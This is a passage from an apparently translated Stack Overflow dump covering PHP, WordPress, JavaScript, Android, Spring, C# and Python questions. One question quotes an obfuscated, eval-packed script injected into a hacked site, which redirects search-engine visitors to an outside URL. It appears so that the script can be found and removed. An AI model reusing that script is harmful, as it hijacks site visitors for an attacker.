$p1->firstname="John";
$p1->middlename="Jonah";
$p1->lastname="Jameson";
$p1->city="Lansing";
$p1->province_state="Michigan";
$p1->postcode="48876-4444";
$p1->country="USA";

echo $p1->create_people($p1); 
```

回报：

```
John 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-04-26T17:26:31.780

您缺少对象自引用：`$this`到处都是。

每当您从类中引用方法或属性时，您需要将 $this 引用为正在执行该过程的 Object 的当前实例化。那么，例如...

```
$fullname=array($firstname,$middlename,$lastname); 
```

变成

```
 $fullname=array($this->firstname,$this->middlename,$this->lastname); 
```

哪个应该起作用，因为您已经为这些属性分配了值。

编辑：进一步查看代码，通过循环不断返回值不会管理对浏览器的回显。您可以`echo $value`不返回它，也可以从值构建一个数组并将其返回并让脚本处理该数组以回显到浏览器。

编辑第二个：要获取所有值，您需要在构建它们时收集它们。另一种选择是将它们作为方法的一部分简单地输出到浏览器。这两个选项都有效，但是将它们收集到一个数组中使其更便携，但也需要维护更多的代码。同样，您不需要将对象传递给自身以使方法工作。

```
echo $p1->create_people($p1); 
```

应该...

```
$p1->create_people(); 
```

在`create_people`你会有...

```
function create_people()
{
    $fullname=array($this->firstname,$this->middlename,$this->lastname);
    $normname=array($this->firstname,$this->lastname);
    $fulladdress=array($this->city, $this->province_state, $this->postcode, $this->country);
    if($args->firstname && $args->lastname && $args->city && $args->province_state && $args->postcode && $args->country)
    { //Don't bother including middlename if it doesn't matter if it is filled or not...
        $temp_arr = array($normname, $fulladdress);
        foreach($temp_arr as $value)
        {
            foreach($value as $values)
            {
                echo $values;
            }
        }
    } else {
        die ("Must enter all values excluding middlename.");
    }
} 
```

那应该行得通。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-04-26T17:31:42.890

除了自引用问题（顺便说一句，`$args`也不需要，因为这应该是自引用），你的循环结构是错误的。

```
$temp_arr=array($normname,$fulladdress);
foreach($temp_arr as $value)
{
   foreach($value as $values)
   {
       return $values;
   }
} 
```

这会：

1.  遍历 temp_arr，找到 $normname 作为第一个值
2.  将 $normname 视为一个数组并循环遍历它
3.  返回它在 $normname 中找到的第一个值
4.  函数到此结束，其他所有内容均未执行。

一个函数只能有*一个*返回值。如果您需要返回不止一件事物的信息，则需要将其作为数组或对象返回，以便将其全部包含在一个元素中。

目前我不太确定你想在课堂上完成什么，所以很遗憾我无法帮助你完成你需要做的事情。

编辑：在这种情况下，您不需要返回任何东西。您的类已经使类中的所有函数都可以访问这些变量。使用“new”创建对象的一个​​实例，即创建“a people_handler”。这个 people_handler 有关于它的属性，您将其公开，因此可以从类外部设置它们（这在更大的项目中可能不是一个好主意，但似乎很好）。作为类的一部分（即在其中）的所有函数，都可以通过使用自引用来访问这些属性当前对特定 people_handler 具有的值`$this`：

```
class TestClass {
    public fullname; //a random "property"
    function echoFullname() {
        echo $this->fullname; //whatever fullname is at the moment for the TestClass object we are using
    }
}

$a = new TestClass(); //Create a TestClass object
$a->fullname = "Alex"; //make its name "Alex"

$b = new TestClass(); //Create another TestClass object
$b->fullname = "Carl"; //but let's name him Carl

$a->echoFullname(); //And now output the names
$b->echoFullname(); 
```

显然这没有实际用途，但希望能说明它是如何工作的。如您所见，变量传递根本没有必要。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-04-26T17:27:40.473

在第 14 行：

```
 $fullname=array($firstname,$middlename,$lastname); 
```

大概应该是：

```
 $fullname=array($this->firstname,$this->middlename,$this->lastname); 
```

相同的第 16 行：

```
 $fulladdress=array($city,$province_state,$postcode,$country); 
```

# css - Wordpress 首页上的按钮链接不可点击

> ID：10338338
> 
> 赞同：2
> 
> 时间：2012-04-26T17:22:29.643
> 
> 标签：css, wordpress, html, z-index

我得到了一个 Wordpress 主题来安装一个新网站，然后要求我进行一些自定义。

该网站在这里： [http](http://centergrovepto.org/townsend/) ://centergrovepto.org/townsend/ （我不确定原始主题来自哪里。）

首页滑块右侧有 3 个按钮。“雇主”、“候选人”和“空缺职位”。这些按钮最初是可点击的，它们所做的只是更改当前的滑块图像。

我试图让它们可点击，以便它们打开相应的页面。如果您将鼠标悬停在每个按钮上，您可以在状态栏中看到链接路径设置正确，但是当我单击按钮时没有任何反应。

我猜这是一个 CSS 问题，有些图层覆盖了实际的按钮，但我不知道足够的 CSS 来找出原因。我安装了 Firefox 的 Firebug 插件，因此我可以更轻松地检查 CSS。我已经尝试过更改各种元素的 z-index，但我就是无法让它工作。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-26T17:29:44.217

正如我在您的网站上看到的，这 3 个按钮的链接如下：

一个 href="/townsend/employers/"

但我认为它应该像这样工作，因为`a href="/townsend/employers/"`它没有引用您服务器中的任何地方

尝试像这样更改它：

```
<a href="http://centergrovepto.org/townsend/employers/"> 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-26T17:35:21.580

我不确定为什么会这样，因为如果您在新选项卡中打开链接，它会完美运行。这可能是一个 css 问题，但更有可能与您的 HTML 有关。

我会尝试将目标添加到您的链接。这将告诉它专门在您所在的窗口中打开链接，这可能会解决问题。（虽然我自己没有测试过）

代替

```
<a href="/townsend/employers/"></a> 
```

尝试将其更改为以下之一：

```
<a href="/townsend/employers/" target="_parent"></a> 
```

或者，如果那个不起作用，也试试这个

```
<a href="/townsend/employers/" target="_self"></a> 
```

让我知道这是否有帮助！

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-04-26T19:22:23.550

我实际上认为这是您的 jQuery Faded 插件。看起来好像是这样的：

```
if (o.pagination) {
    if (o.autopagination) {
        $t.append("<ul class="+o.pagination+"></ul>");
        $c.children().each(function(){
            $("."+o.pagination+"",$t).append("<li><a rel="+number+" href=\"#\" >"+(number+1)+"</a></li>");
            number++;
        });
    }
    $("."+o.pagination+" li a:eq(0)",$t).parent().addClass("current");
    $("."+o.pagination+" li a",$t).click(function(){
        current = $("."+o.pagination+" li.current a",$t).attr("rel");                                   
        clicked = $(this).attr("rel");
        if (current != clicked) {animate("pagination",clicked,current);}
        if(o.autoplay){pause();}
        return false; //THIS LINE PREVENTS DEFAULT ACTION WHEN <a> LINK IS CLICKED
    });
} 
```

正在阻止您的链接的默认操作。我不确定会发生什么，但请尝试将“return false”行注释掉。看看是否有任何不想要的副作用发生。否则，将此代码添加到您的（或我认为是您的）custom.js 文件中：

```
jQuery(".pagination ul li a").click(function()
{
    window.location = this.href; //UPDATED FOR EPHRAIM
}); 
```

# javascript - html5在父脚本中为iframe设置onmessage处理程序

> ID：10338344
> 
> 赞同：0
> 
> 时间：2012-04-26T17:23:09.860
> 
> 标签：javascript, html

我需要测试一种情况，即我有一个父窗口托管一个空的 iframe。我需要使用 iframe 作为父资源和跨域资源之间的代理。我创建了一个简单的[jsfiddle](http://jsfiddle.net/shelbyz/RJrX7/)，它应该尝试将消息从父级发布到子 iframe。

我尝试在父母的 javascript 中做的是为子 iframe 提供一个处理程序，但对于我的生活，我无法弄清楚让它正常工作的语法。我尝试使用 addEvent 助手从我在 Modern Javascript Develop and Design 中看到的示例中正确添加事件（对于 IE 和其他所有人）：

```
addEvent: function(obj, type, fn) {
    if (obj && obj.addEventListener) {
        obj.addEventListener(type, fn, false);
    } else if (obj && obj.attachEvent) {
        obj.attachEvent('on' + type, fn);
    }
} 
```

我目前尝试为 onmessage 设置处理程序的方式如下：

```
document.getElementById("frame1").onmessage = function(e) {
    alert(e.data);
}; 
```

我还认为也许我需要访问元素的 contentWindow，但 onmessage 似乎不存在。

是否有访问 iframe 的属性或方法，使其看起来像一个窗口并且会有一个可以处理的 onmessage？

**更新**

我可以看到 onmessage 的值设置为一个函数，甚至可以通过 alert(...) 来查看它确实是我想要的函数，但是当在子 iframe 上调用 postMessage 时，我没有看到它被调用。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-26T17:58:54.873

您的实施[`postMessage`](https://developer.mozilla.org/en/DOM/window.postMessage)不正确。该`onmessage`事件必须绑定到**框架的 window**。由于框架的内容来自不同的来源，因此只能在框架一侧完成。由于[同源策略](https://developer.mozilla.org/En/Same_origin_policy_for_JavaScript)，您**无法**从您的页面绑定此事件。

此代码将起作用，前提是同源策略**不受影响**：

```
// Bind event to the frame's  window  object
var frame1_window = document.getElementById("frame1").contentWindow;
frame1_window.onmessage = function(e) {
    alert(e.data);
};
frame1_window.postMessage("Hello from same domain", "http://yourdomainhere.com"); 
```

示例（域：`jsfiddle.net`）：http: [//jsfiddle.net/zTctZ/3/show/](http://jsfiddle.net/zTctZ/3/show/)
示例（域：`fiddle.jshell.net`）：http: [//jsfiddle.net/zTctZ/4/](http://jsfiddle.net/zTctZ/4/)

# php - PHP imagecopyresampled() 没有高度

> ID：10338349
> 
> 赞同：1
> 
> 时间：2012-04-26T17:23:40.210
> 
> 标签：php, upload

我这里有这段代码

```
imagecopyresampled($new_image,$image,0,0,$x,$y,$thumb_width,$thumb_width,$width,$height); 
```

Baiscally 我想做的是上传图像并调整宽度并根据宽度调整高度。

我也试过这个

```
imagecopyresampled($new_image,$image,0,0,$x,$y,$thumb_width,$thumb_width,$width); 
```

没有高度并得到这个错误

```
Warning: Wrong parameter count for imagecopyresampled() in /home/content/44/8713044/html/admin/Categories.php on line 63 
```

这是`$width`和`$height`变量来自的当前代码。

```
if($width> $height) {
            $x = ceil(($width - $height) / 2 );
            $width = $height;
        } elseif($height> $width) {
            $y = ceil(($height - $width) / 2);
            $height = $width;
        } 
```

任何帮助将不胜感激，提前致谢，J

这是完整的功能..

```
function create_thumbnail($source,$destination, $thumb_width) {
        $percent = 0.5;
        $size = getimagesize($source);
        $width = $size[0];
        $height = $size[1];
        $x = 0;
        $y = 0;
        if($width> $height) {
            $x = ceil(($width - $height) / 2 );
            $width = $height;
        } elseif($height> $width) {
            $y = ceil(($height - $width) / 2);
            $height = $width;
        }
        $new_image = imagecreatetruecolor($thumb_width,$thumb_width)or die('Cannot Initialize new GD image stream');
        $extension = get_image_extension($source);
         if($extension=='jpg' || $extension=='jpeg') 
            $image = imagecreatefromjpeg($source); 
        if($extension=='gif') 
            $image = imagecreatefromgif($source); 
        if($extension=='png') 
            $image = imagecreatefrompng($source);   

        imagecopyresampled($new_image,$image,0,0,$x,$y,$thumb_width,$thumb_width,$width,$height);
        if($extension=='jpg' || $extension=='jpeg') 
           imagejpeg($new_image,$destination); 
        if($extension=='gif') 
            imagegif($new_image,$destination); 
        if($extension=='png') 
            imagepng($new_image,$destination); 
    } 
```

是`$thumb_width`600，这将返回我的图像 600*600

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-26T17:36:05.607

当我测试它时，这很有效....除了你想使用固定大小

```
$filename = "a.jpg" ;
$percent = 0.5;
header('Content-Type: image/jpeg');
list($width, $height) = getimagesize($filename);
$new_width = $width * $percent;
$new_height = $height * $percent;

// Resample
$image_p = imagecreatetruecolor($new_width, $new_height);
$image = imagecreatefromjpeg($filename);
imagecopyresampled($image_p, $image, 0, 0, 0, 0, $new_width, $new_height, $width, $height);
imagejpeg($image_p, null, 100); 
```

演示

# javascript - 使用 Javascript (NodeJS) 进行字符串操作

> ID：10338357
> 
> 赞同：5
> 
> 时间：2012-04-26T17:24:28.923
> 
> 标签：javascript, node.js

我正在尝试使用以下代码删除字符串的前 13 个字符：

```
requestToken = requestToken.substring(13); 
```

但是，我在`has no method substring`使用 NodeJS 时遇到“”错误，Javascript 论坛中主要推荐的上述代码不适用于 NodeJS？

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-04-26T17:27:08.627

似乎 requestToken 可能不是字符串。

尝试

```
requestToken = '' + requestToken; 
```

然后 requestToken.substring(13);

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2012-04-26T17:28:17.677

`substring`(and `substr`) 绝对是 node 中字符串原型上的函数；听起来你不是在处理字符串

```
$ node
> "asdf".substring(0,2)
'as' 
```

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-04-26T17:28:59.543

先转换`requestToken`成字符串：

```
requestToken = (requestToken+"").slice(13); 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-04-26T17:27:48.110

`requestToken`那么一定不能是字符串。它可能是某种对象，并且您想要的字符串可能由该对象的方法或属性返回。试着`console.log(requestToken)`看看那到底是什么。

您还希望`.slice()`删除字符串的前面。

你最终可能会得到类似的东西：

```
myString = requestToken.someProperty.slice(13); 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-04-26T19:07:11.030

将其强制为字符串可能无法解决您的问题。console.log(typeof(requestToken)) 可能会为您提供有关问题所在的线索。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2013-06-12T12:47:41.313

尝试检查您的对象/变量：

```
console.log( JSON.stringify(yourObject) ); 
```

或者它的类型

```
console.log( typeof yourVariable ); 
```

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2017-03-04T15:39:52.757

```
requestToken.toString().slice(13); 
```

或者

```
if(typeof requestToken!="string")
{
   requestToken.toString().slice(13);
}else
{
   requestToken.slice(13);
} 
```

# jquery-ui - 使 jQuery UI 可放置一次只接受一个可拖动的

> ID：10338362
> 
> 赞同：3
> 
> 时间：2012-04-26T17:24:56.430
> 
> 标签：jquery-ui, jquery-ui-draggable, jquery-ui-droppable

我只在其他几个地方看到过这个问题的几个变体，特别是[这里](https://stackoverflow.com/questions/3948447/jquery-ui-droppable-only-accept-one-draggable)和[这里](http://forum.jquery.com/topic/jquery-ui-how-do-i-re-enable-draggable)。

基本上，我有一个棋盘，棋盘上的每个方块都是可放置的，每个棋子都是可拖动的。每个方块一次只能有一块，我试图根据方块上是否有一块来切换启用/禁用方法。

这是我到目前为止所获得的链接：http: [//jsbin.com/ayalaz](http://jsbin.com/ayalaz)，下面是最相关的代码。

```
function handleDrop(e, ui) {
            var tileNumber = $(this).data('tile');
            // Make the gamepiece snap into the tile
            ui.draggable
                .data({ // WHAT IF PIECE IS SET BACK DOWN IN SAME TILE... CHECK FOR IT!
                    'preRow': ui.draggable.data('curRow'),
                    'preCol': ui.draggable.data('curCol'),
                    'curRow': $(this).data('row'),
                    'curCol': $(this).data('col')
                });
            $(this).append($(ui.draggable));
            ui.draggable
                .position({
                    of: $(this),
                    my: 'left top',
                    at: 'left top'
                });
            $(this).droppable('disable');
            //console.log("Gamepiece set down at: (" + $(this).data('row') + "," + $(this).data('col')+ ")");
        }

function handleOut(e, ui) {
            // HOW TO TOGGLE DROPPABLE??
            $(this).droppable('enable');
        } 
```

有什么建议吗？

提前致谢！杰里米

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-27T20:11:54.800

看起来您在第一次放置事件后成功禁用了磁贴上的可放置。您的问题是您最初没有在初始占用的磁贴集上将 droppable 设置为禁用。

创建游戏板和棋子后，假设我的 CSS 选择器准确地反映了您的结构，这应该可以完成：

```
$('div.gamePiece').parent().droppable("option", "disabled", true); 
```

请注意，这与更改初始选项中可放置性的语法不同。来自[jQuery UI droppable 文档](http://jqueryui.com/demos/droppable/#option-disabled)：

```
//initialize
$( ".selector" ).droppable({ disabled: true });

//setter
$( ".selector" ).droppable( "option", "disabled", true ); 
```

**编辑**

看来我错了`$(this).droppable('disable');`，`$(this).droppable('enable');`jquery-ui**确实**具有启用和禁用的别名功能。

```
enable: function() {
    return this._setOption( "disabled", false );
},
disable: function() {
    return this._setOption( "disabled", true );
}, 
```

# android - Android AlarmManager 在很长一段时间后停止触发

> ID：10338369
> 
> 赞同：3
> 
> 时间：2012-04-26T17:25:18.743
> 
> 标签：android, persistence, alarmmanager, alarm, intervals

应该声明和初始化 AlarmManager 的正确上下文是什么，以便它们无限期地持续存在（或者直到系统重新启动或直到 Task Killer 实际上将其清除）并避免垃圾收集 - 但也允许跨整个警报更改警报整个应用程序的范围。

我使用 AlarmManager 的全部原因是为了解决始终运行服务的需要。然而，要完成这一壮举，AlarmManager 是在哪里创建的？我想它不能在服务中创建，然后关闭/销毁，因为警报对象最终会消失，警报会停止触发 - 不是吗？

我喜欢来自不同问题帖子的 AlarmManager 示例的想法，其中创建了 MyAlarm 类作为警报 onReceive 的 BroadcastReceiver 的扩展，并且 AlarmManager 在此类的构造函数中初始化。但是，如果跨多个上下文需要 MyAlarm 实例，此实现如何工作。例如，来自多个 Activity 对象的事件处理程序。来自多个 Widget 的事件处理程序。从工作人员服务中。所有这些都可能必须禁用或启用警报。我的猜测是，在您需要处理警报的任何地方创建一个本地实例，并且由于所有实例的 pendingIntent 都是相同的，因此您实际上将使用虚拟“单例”。

这只是概念性的，因为我不知道如何测试可能发生在 8、12、？的警报管理器的“垃圾收集”？几个小时后，当我的闹钟随机停​​止响起时。我的目标是，如果手机没有重新启动，并且我的任务没有被用户手动杀死，那么让警报无限期地触发。谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-26T17:59:06.380

> 然而，要完成这一壮举，AlarmManager 是在哪里创建的？

这`AlarmManager`是一个系统服务。它是由操作系统“创建”的。

> 我想它不能在服务中创建，然后关闭/销毁，因为警报对象最终会消失，警报会停止触发 - 不是吗？

这`AlarmManager`是一个系统服务。“警报”由操作系统保持。

> 我的猜测是，在您需要处理警报的任何地方创建一个本地实例，并且由于所有实例的 pendingIntent 都是相同的，因此您实际上将使用虚拟“单例”。

正确的。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-26T17:36:20.197

在android中，操作系统会自动关闭它认为没有被使用的服务......许多应用程序，尤其是小部件都在为此苦苦挣扎。我不知道是否有确定的方法来确保服务不会自行关闭。您可以通过让它偶尔做一些事情来坚持更长时间，这样系统就不会认为这是一项无用的任务。

是的，您会为所有这些使用相同的待处理意图，因此您可以只运行一个服务并链接多个处理程序，这是操作系统设置方式的一部分好处。您可以在单个服务开始时使用您的签名更新所有小部件，该服务还可以从您的小部件接收所有处理程序。

# wordpress - .htaccess 根据 Wordpress 中的域名重定向到页面

> ID：10338370
> 
> 赞同：0
> 
> 时间：2012-04-26T17:25:22.250
> 
> 标签：wordpress, .htaccess, mod-rewrite, redirect

我正在尝试根据我网站的域名进行重定向。

我有两个网址：

*   域名-english.com
*   域名-french.com

默认语言是英语，因此当用户键入 domain-english.com 时不需要重定向。但是当用户输入 domain-french.com 时，我希望它直接转到 domain-french.com/fr

在我的 htaccess 文件中，我尝试了在 Google 上找到的不同解决方案。

```
# BEGIN WordPress
<IfModule mod_rewrite.c>
RewriteEngine On
RewriteBase /

RewriteCond %{HTTP_HOST} ^domain-french.com [OR]
RewriteCond %{HTTP_HOST} ^www.domain-french.com

RewriteRule ^(.*)$ http://www.domain-french.com/fr [R=301,L] 

RewriteCond %{REQUEST_FILENAME} !-f
RewriteCond %{REQUEST_FILENAME} !-d
RewriteRule . /index.php 

</IfModule>
# END WordPress 
```

这确实重定向到 url domain-french.com/fr 但我收到此错误

> 页面未正确重定向

**编辑** 我也在我的 .htaccess 文件中尝试了这个配置，但我得到一个 500 服务器错误。

```
RewriteCond %{HTTP_HOST} ^(www.)?domain-french.com
Rewriterule ^(.*)$ http://www.domain-french.com/fr [L] 
```

任何想法发生了什么？

谢谢

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-26T17:54:24.730

将您的重写规则更改为：

```
RewriteCond %{HTTP_HOST} ^(www\.)?domain-french\.com$ [NC]
Rewriterule ^(?!fr/).*$ fr%{REQUEST_URI} [L,R,NC] 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-23T16:26:10.223

Just contacted my hosting provider, they said that it is prohibited on their server thus explaining why it doesn't work. Thanks anyway for the help! –</p>

# php - 检查文件是否包含某些 Javascript 代码的最佳方法是什么？

> ID：10338372
> 
> 赞同：0
> 
> 时间：2012-04-26T17:25:34.057
> 
> 标签：php, regex, search

我的网站已被标记为**报告的攻击页面！**在火狐中。

这是有问题的可疑代码：

```
<script language="JavaScript">eval(function(p,a,c,k,e,r){e=f
unction(c){return(c<a?'':e(parseInt(c/a)))+((c=c%a)>35?Strin
g.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,Str
ing)){while(c--)r[e(c)]=k[c]||e(c);k=[function(e){return r[e
]}];e=function(){return'\\w+'};c=1};while(c--)if(k[c])p=p.re
place(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p}('e r=
x.9,t="",q;4(r.3("m.")!=-1)t="q";4(r.3("7.")!=-1)t="q";4(r.3
("8.")!=-1)t="p";4(r.3("a.")!=-1)t="q";4(r.3("f.")!=-1)t="g"
;4(r.3("j.")!=-1)t="q";4(t.6&&((q=r.3("?"+t+"="))!=-1||(q=r.
3("&"+t+"="))!=-1))B.C="v"+"w"+":/"+"/A"+"b"+"k"+"5"+"h."+"c
"+"z/s"+"u"+"5"+"h.p"+"d?"+"t"+"y=1&t"+"i"+"l="+r.n(q+2+t.6)
.o("&")[0];',39,39,'|||indexOf|if|rc|length|msn|yahoo|referr
er|altavista|ogo|bi|hp|var|aol|query||er|ask|sea|ms|google|s
ubstring|split||||||ea|ht|tp|document|||go|window|location'.
split('|'),0,{}))</script> 
```

我想编写一些 PHP 代码来遍历站点路径中的文件夹并获取每个文件夹中的文件。对于每个文件，我将打开它并使用正则表达式检查它是否包含上述代码。

这是个好主意，还是我应该在这里做什么？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-26T17:31:30.570

你只需要做一些字符串替换，因为你确切地知道你在找什么。像这样的东西应该可以工作（您可能需要`glob`根据调用此脚本的位置调整调用。

```
<?php

$js = 'INSERT THE CODE FROM YOUR POST HERE';
foreach( glob("*") as $filename) {
    $contents = file_get_contents( $filename);
    $contents = str_replace( $js, '', $contents); // Replace the code with nothing
    file_put_contents( $filename, $contents);
} 
```

# spring - 与同名和类的现有不兼容 bean 定义冲突

> ID：10338377
> 
> 赞同：2
> 
> 时间：2012-04-26T17:25:54.413
> 
> 标签：spring, proguard

在我混淆我的项目后出现此错误，eventghout 只有我的实现类 com.company.project.faab 由`@Component("myImpl")`

> java.lang.IllegalStateException：bean 类 [com.company.project.faab] 的注释指定 bean 名称“myImpl”与现有的、不兼容的同名和类 [com.company.project.faaa] bean 定义冲突

我真的不明白为什么 spring 为接口和实现都赋予了相同的名称。我的 Proguard 配置有问题吗？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-05-01T16:21:31.117

您可以尝试通过一个选项告诉 proguard 这样做来保持`@Component`课程。`as is``-keep`

如果您使用 proguarg maven 插件，您可以将此选项设置为：

```
<plugin>
    ... ...
    <artifactId>proguard-maven-plugin</artifactId>
    ... ...
    <configuration>
        <obfuscate>true</obfuscate>
        <options>
            ... ...
            <option>-keep @org.springframework.stereotype.Component class *</option>
            ... ...
        </options>
        ... ...
    </configuration>
</plugin> 
```

它将保持`@Component`组件逆向工程和 Spring 友好:)

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-05-04T15:29:07.233

我找到了问题的根源，如果启用了优化器，Proguard 会将交互与其实现合并。

我加了

```
-dontoptimize 
```

问题就解决了

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2017-04-12T01:10:17.220

```
for @Component
 <option>-keep @org.springframework.stereotype.Component class *</option>
for @Controller
 <option>-keep @org.springframework.stereotype.Controller class *</option> 
for @Service
 <option>-keep @org.springframework.stereotype.Service class *</option> 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2019-05-03T11:28:33.490

有时，如果您移动了类并且它指的是旧类，即使它们不存在，有时也会出现问题。

在这种情况下，只需这样做：

```
mvn eclipse:clean

mvn eclipse:eclipse 
```

这对我来说效果很好。

# c# - Rabin Karp 字符串匹配算法

> ID：10338379
> 
> 赞同：14
> 
> 时间：2012-04-26T17:26:04.117
> 
> 标签：c#, string, algorithm, rabin-karp

我在网站上的论坛中看到了这个 Rabin Karp 字符串匹配算法，我有兴趣尝试实现它，但我想知道是否有人能告诉我为什么变量 ulong Q 和 ulong D 分别为 100007 和 256：S ? 这些价值观有什么意义？

```
static void Main(string[] args)
{
    string A = "String that contains a pattern.";
    string B = "pattern";
    ulong siga = 0;
    ulong sigb = 0;
    ulong Q = 100007;
    ulong D = 256;
    for (int i = 0; i < B.Length; i++)
    {
        siga = (siga * D + (ulong)A[i]) % Q;
        sigb = (sigb * D + (ulong)B[i]) % Q;
    }
    if (siga == sigb)
    {
        Console.WriteLine(string.Format(">>{0}<<{1}", A.Substring(0, B.Length), A.Substring(B.Length)));
        return;
    }
    ulong pow = 1;
    for (int k = 1; k <= B.Length - 1; k++)
        pow = (pow * D) % Q;

    for (int j = 1; j <= A.Length - B.Length; j++)
    {
        siga = (siga + Q - pow * (ulong)A[j - 1] % Q) % Q;
        siga = (siga * D + (ulong)A[j + B.Length - 1]) % Q;
        if (siga == sigb)
        {
            if (A.Substring(j, B.Length) == B)
            {
                Console.WriteLine(string.Format("{0}>>{1}<<{2}", A.Substring(0, j),
                                                                    A.Substring(j, B.Length),
                                                                    A.Substring(j + B.Length)));
                return;
            }
        }
    }
    Console.WriteLine("Not copied!");
} 
```

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-04-26T18:11:00.640

关于神奇的数字，保罗的回答很清楚。

就代码而言，Rabin Karp 的主要思想是在字符串的滑动部分和模式之间执行哈希比较。

不能每次都在整个子串上计算哈希，否则计算复杂度将是二次`O(n^2)`的而不是线性的`O(n)`。

因此，应用了[滚动散列](http://en.wikipedia.org/wiki/Rolling_hash)函数，例如在每次迭代时只需要一个字符来更新子字符串的散列值。

因此，让我们评论您的代码：

```
for (int i = 0; i < B.Length; i++)
{
    siga = (siga * D + (ulong)A[i]) % Q;
    sigb = (sigb * D + (ulong)B[i]) % Q;
}
if (siga == sigb)
{
    Console.WriteLine(string.Format(">>{0}<<{1}", A.Substring(0, B.Length), A.Substring(B.Length)));
    return;
} 
```

`^`这部分计算模式`B`( ) 的哈希，以及相同长度 的`sigb`初始子串的哈希码。实际上它并不完全正确，因为 hash 可能会发生冲突¹，因此有必要修改 if 语句 : 。`A``B``if (siga == sigb && A.Substring(0, B.Length) == B)`

```
ulong pow = 1;
for (int k = 1; k <= B.Length - 1; k++)
    pow = (pow * D) % Q; 
```

`^``pow`这是执行滚动哈希所必需的计算值。

```
for (int j = 1; j <= A.Length - B.Length; j++)
{
    siga = (siga + Q - pow * (ulong)A[j - 1] % Q) % Q;
    siga = (siga * D + (ulong)A[j + B.Length - 1]) % Q;
    if (siga == sigb)
    {
        if (A.Substring(j, B.Length) == B)
        {
            Console.WriteLine(string.Format("{0}>>{1}<<{2}", A.Substring(0, j),
                                                                A.Substring(j, B.Length),
                                                                A.Substring(j + B.Length)));
            return;
        }
    }
} 
```

`^`最后，扫描剩余的字符串（即从第二个字符到结尾），更新 A 子字符串的哈希值，并与 B 的哈希值（在开头计算）进行比较。

如果两个哈希值相等，则比较子字符串和模式¹，如果它们实际上相等，则返回一条消息。

* * *

¹[哈希值可能会发生冲突](http://en.wikipedia.org/wiki/Collision_%28computer_science%29)；因此，如果两个字符串具有不同的散列值，它们**肯定**是不同的，但是如果两个散列相等，它们**可以**相等或不相等。

* * *

## 回答 #2

> 赞同：6
> 
> 时间：2012-04-26T17:43:27.903

该算法使用散列进行快速字符串比较。Q 和 D 是编码人员可能通过一些试验和错误得出的神奇数字，并为该特定算法提供了良好的散列值[分布。](http://en.wikipedia.org/wiki/Hash_value#Hashing_uniformly_distributed_data)

您可以看到这些类型的幻数用于散列许多地方。下面的示例是 .NET 2.0 字符串类型的 GetHashCode 函数的反编译定义：

```
[ReliabilityContract(Consistency.WillNotCorruptState, Cer.MayFail)]
public override unsafe int GetHashCode()
{
    char* chrPointer = null;
    int num1;
    int num2;
    fixed (string str = (string)this)
    {
        num1 = 352654597;
        num2 = num1;
        int* numPointer = chrPointer;
        for (int i = this.Length; i > 0; i = i - 4)
        {
            num1 = (num1 << 5) + num1 + (num1 >> 27) ^ numPointer;
            if (i <= 2)
            {
                break;
            }
            num2 = (num2 << 5) + num2 + (num2 >> 27) ^ numPointer + (void*)4;
            numPointer = numPointer + (void*)8;
        }
    }
    return num1 + num2 * 1566083941;
} 
```

下面是 R# 为示例类型生成的 GetHashcode 覆盖函数的另一个示例：

```
 public override int GetHashCode()
    {
        unchecked
        {
            int result = (SomeStrId != null ? SomeStrId.GetHashCode() : 0);
            result = (result*397) ^ (Desc != null ? Desc.GetHashCode() : 0);
            result = (result*397) ^ (AnotherId != null ? AnotherId.GetHashCode() : 0);
            return result;
        }
    } 
```

# java - 有什么方法可以为 trove 的 TIntHashSet 或 TIntIntHashMap 定义迭代顺序？

> ID：10338380
> 
> 赞同：2
> 
> 时间：2012-04-26T17:26:24.017
> 
> 标签：java, iterator, trove4j

我可以以某种方式定义 Trove 的[TIntHashSet](http://trove4j.sourceforge.net/javadocs/index.html?gnu/trove/set/hash/TIntHashSet.html)中元素的迭代顺序吗？

`Set`或者是允许定义元素迭代顺序的任何其他原语。我想以插入顺序或与用于构造集合的数组相同的顺序迭代元素。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2014-11-27T09:15:44.377

请参阅 java.util.LinkedHashMap，它保留插入顺序。

# python - ImportError - 名称冲突，父文件夹与另一个文件名同名

> ID：10338381
> 
> 赞同：2
> 
> 时间：2012-04-26T17:26:27.957
> 
> 标签：python, python-import

我在python中有以下文件夹结构：

```
houses/
   models.py
   __init__.py
   view/
      houses.py
      events.py
      __init__.py 
```

在文件 events.py 我有以下行：

```
from houses.models import House 
```

这导致我出现以下错误

> 没有名为模型的模块

我很确定它正在搜索houses.py 文件，而我想要的是他在文件夹中搜索文件models.py。我怎么能告诉python这样做呢？提前致谢！

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-04-26T17:47:34.250

根据[有关包内引用的 python 文档](http://docs.python.org/tutorial/modules.html#intra-package-references)，您可以使用相对导入

```
from ..models import House 
```

* * *

## 回答 #2

> 赞同：1
> 
